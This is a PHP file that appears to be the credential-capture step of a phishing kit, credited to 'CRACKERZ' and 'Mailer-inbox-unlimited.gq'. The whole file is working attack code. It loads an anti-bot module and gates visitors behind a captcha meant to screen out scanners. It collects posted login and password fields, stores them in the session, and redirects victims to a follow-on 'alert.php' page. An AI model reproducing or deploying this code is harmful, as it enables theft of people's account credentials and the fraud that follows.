<?php

session_start();

/* Programmer name :

    ╔╗ ╦ ╦  ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗╔═╗
    ╠╩╗╚╦╝  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝╔═╝
    ╚═╝ ╩   ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═╚═╝

        #2018  Mailer-inbox-unlimited.gq  */
    
require_once 'admin/config.php';
require_once 'anti.php';


$l1 = @$_POST['l1'];
$l2 = @$_POST['l2'];

$rand = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 5)), 0, 20);


if ($enable_captcha == 1) {

  if ($_GET['bot'] == '_human_') {

    // Hello Human :d

    $_SESSION['capochino'] = '_human_';

  }else{

    // $_SESSION['capochino'] = '_bot_';
    
    // loop fake bitch :v
    //header("Location: index.php");
    $empty_mail = '';

    if (empty($l1)) {
      $empty_mail = '&err1=1';
    }

    echo '<script type="text/javascript">window.location.replace("login.php?'.$rand.$empty_mail.'&l1='.base64_encode($l1).'&err2=1&cap=1");</script>';

    die();

  }

}else{

  $_SESSION['capochino'] = '_human_';

}



// Redirect to index if SESSION empty or not set 
if (file_exists("lang/". $_SESSION['_lang_'].".php")) {
    
   include("lang/". $_SESSION['_lang_'].".php");

} else {
    
   //header("Location: index.php");
    echo '<script type="text/javascript">window.location.replace("index.php");</script>';

   die();

}



if ($required_login == 1) {


if (empty($l1)) {
    // header('Location: login.php?'.$rand.'&l1='.base64_encode($l1).'&err1=1&err2=1');
    echo '<script type="text/javascript">window.location.replace("login.php?'.$rand.'&l1='.base64_encode($l1).'&err1=1&err2=1");</script>';
    die();
}

if (empty($l2)) {
    
    $emp = '';

    if (empty($l1)) {
      $emp = '&err1=1';
    }

   //header('Location: login.php?'.$rand.'&l1='.base64_encode($l1).'&err2=1&'.$emp);
   echo '<script type="text/javascript">window.location.replace("login.php?'.$rand.'&l1='.base64_encode($l1).'&err2=1&'.$emp.'");</script>';
  die();

}

}

$_SESSION['l1'] = $l1;
$_SESSION['l2'] = $l2;

$_SESSION['capochino'] = '_human_';

//header('Location: alert.php?'.$rand);
echo '<script type="text/javascript">window.location.replace("alert.php?'.$rand.'");</script>';

   





?>
